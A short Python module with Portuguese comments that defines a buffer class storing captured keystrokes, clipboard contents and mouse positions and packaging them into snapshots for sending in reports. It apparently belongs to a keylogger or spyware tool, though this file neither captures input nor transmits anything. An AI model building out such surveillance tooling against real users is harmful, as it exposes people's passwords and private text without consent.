import threading


class BufferManager:
    """Gerencia os buffers de keystrokes, clipboard e posições do mouse."""

    def __init__(self):
        self.lock = threading.Lock()
        self.keystrokes = []
        self.clipboard = []
        self.mouse_positions = []
        self.current_session = []
        self.last_clipboard = ""

    def flush_session(self, session_time: str):
        """Move a sessão atual para o buffer principal de keystrokes."""
        self.keystrokes.append({
            'time': session_time,
            'keys': self.current_session.copy()
        })
        self.current_session.clear()

    def clear_all(self):
        """Limpa todos os buffers após envio do relatório."""
        self.keystrokes.clear()
        self.clipboard.clear()
        self.mouse_positions.clear()
        self.current_session.clear()
        self.last_clipboard = ""

    def snapshot(self) -> dict:
        """Retorna uma cópia dos dados atuais para envio."""
        return {
            'keystrokes': list(self.keystrokes),
            'clipboard':  list(self.clipboard),
            'mouse_positions': list(self.mouse_positions),
        }
